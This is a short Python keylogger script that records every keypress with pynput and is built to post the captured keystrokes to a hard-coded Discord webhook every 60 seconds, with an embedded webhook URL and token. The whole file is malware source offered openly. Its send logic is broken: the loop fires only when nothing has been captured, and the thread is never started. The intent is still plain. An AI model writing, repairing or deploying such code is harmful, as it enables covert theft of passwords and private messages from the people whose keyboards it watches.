from pynput.keyboard import Key, Listener
from discord_webhook import DiscordWebhook
import time
import threading


WEBHOOK = "https://discord.com/api/webhooks/902490386327556166/n1H-hSOm2PNseWHC-PPNV9vrEPm4tkRhxD9Y3wy7r6b_wCqbZ4nJVhbi4M18LZKbFYOo"
INTERVAL = 60

keystrokes = ""


def on_press(key):
    global keystrokes
    keystrokes+= "\n" + str(key)

def send_keystrokes():
    global keystrokes

    while(1):
        if keystrokes=="":      
            webhook = DiscordWebhook(url=WEBHOOK, content=keystrokes)
            response = webhook.execute()
            print("SENT")
            keystrokes = ""
            time.sleep(INTERVAL)


if __name__ == '__main__':
    x = threading.Thread(target=send_keystrokes, args=())
    x.daemon= True
    x.start
    with Listener(on_press=on_press) as listener:
        listener.join() 
